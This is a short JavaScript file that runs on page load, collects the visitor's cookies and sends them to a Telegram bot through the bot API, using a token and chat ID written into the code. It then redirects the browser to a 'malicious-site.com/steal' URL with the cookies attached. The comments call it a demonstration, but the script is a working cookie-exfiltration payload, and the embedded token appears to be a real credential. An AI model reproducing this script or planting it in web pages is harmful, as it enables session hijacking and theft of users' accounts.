document.addEventListener('DOMContentLoaded', () => {
    console.log('Website loaded!');

    // Set a test cookie for demonstration
    document.cookie = "testCookie=ThisIsATestCookie; path=/";

    // Delay execution to ensure cookies are set
    setTimeout(() => {
        // Get victim's cookies
        var stolenCookies = document.cookie;

        // Check if there are cookies to steal
        if (stolenCookies) {
            console.log("Cookies found:", stolenCookies);

            // Set the Telegram bot token and chat ID
            var botToken = "8175599302:AAFc3F8UxHFsvjhkhJKAHWGN4UeArhdSjcE";
            var chatId = "899184398";

            var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
            var message = "Stolen Cookies: " + encodeURIComponent(stolenCookies);

            // Send cookies to Telegram
            fetch(telegramUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            }).then(response => {
                if (response.ok) {
                    console.log("Cookies sent to Telegram!");
                } else {
                    console.error("Failed to send cookies.");
                }
            }).catch(error => {
                console.error("Error sending cookies:", error);
            });

            // Redirect to malicious site (simulating attack)
            document.location = "https://malicious-site.com/steal?cookie=" + encodeURIComponent(stolenCookies);
        } else {
            console.log("No cookies to steal!");
        }
    }, 1000); // Delay execution by 1 second
});